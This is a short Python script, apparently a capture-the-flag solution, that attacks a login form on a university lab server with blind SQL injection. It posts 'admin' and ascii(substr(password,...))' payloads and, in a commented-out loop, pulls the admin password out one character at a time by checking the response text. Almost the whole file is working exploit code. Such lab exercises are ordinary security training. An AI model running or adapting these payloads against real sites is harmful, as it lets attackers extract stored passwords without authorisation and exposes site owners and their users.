import requests
from sys import stdout

query = 0

cookie = 'GA1.3.490319052.1615048840'
print("[+] brute force")

url = "http://f3b7be27c52b4407a8d5e566eac6614b-0-dba482f-80.vlab.uit.edu.vn/index.php"
flag = ''
data = {'username': "admin' and ascii(substr(password,0,1))=66%23",
        'password': '123',
        'login': 'Login'}
x = requests.post(url, data=data,)
'''
print('[+] find flag:')
for i in range(10):
    for j in range(31, 128):
        password = "123"
        username = "admin' and ascii(substr(password,{0},1))={1}%23".format(
            i, j)
        data = {'username': username,
                'password': password,
                'login': login}
        x = requests.post(url, data=data,)
        if x.text.find("Do you believe") > 0:
            flag += chr(j)
            print("[+] flag is: ", flag)
            break
'''
